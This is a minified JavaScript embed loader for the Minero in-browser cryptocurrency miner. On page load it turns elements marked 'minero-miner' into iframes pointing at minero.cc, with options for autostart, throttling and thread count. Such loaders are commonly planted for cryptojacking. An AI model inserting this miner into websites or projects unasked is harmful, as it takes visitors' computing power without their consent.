self.Minero=self.Minero||{},self.Minero.CONFIG={LIB_URL:"https://minero.cc/lib/",MINER_URL:"https://minero.cc/html/miner.html",BLANK_MINER_URL:"https://minero.cc/html/blank-miner.html",WEBSOCKET_SHARDS:[["wss://worker.minero.cc"]],DONATE_WIDGET_URL:"https://minero.cc/widget/donate"},function(e){"use strict";
var r=function(e){var t=(this.div=e).dataset,r=Minero.CONFIG.MINER_URL+"?key="+t.key+"&user="+encodeURIComponent(t.user||"")+"&autostart="+("true"===t.autostart?"1":"0")+"&throttle="+(t.throttle||"")+"&threads="+(t.threads||"");
this.div.innerHTML="",this.iframe=document.createElement("iframe"),this.iframe.style.width="100%",this.iframe.style.height="100%",this.iframe.style.border="none",this.iframe.src=r,this.div.appendChild(this.iframe)};
r.CreateElements=function(){for(var e=document.querySelectorAll(".minero-miner"),t=0;
t<e.length;
t++)new r(e[t])},"complete"===document.readyState||"interactive"===document.readyState?r.CreateElements():document.addEventListener("readystatechange",function(){"interactive"===document.readyState&&r.CreateElements()}),e.Minero=e.Minero||{},e.Minero.Miner=r}(window);
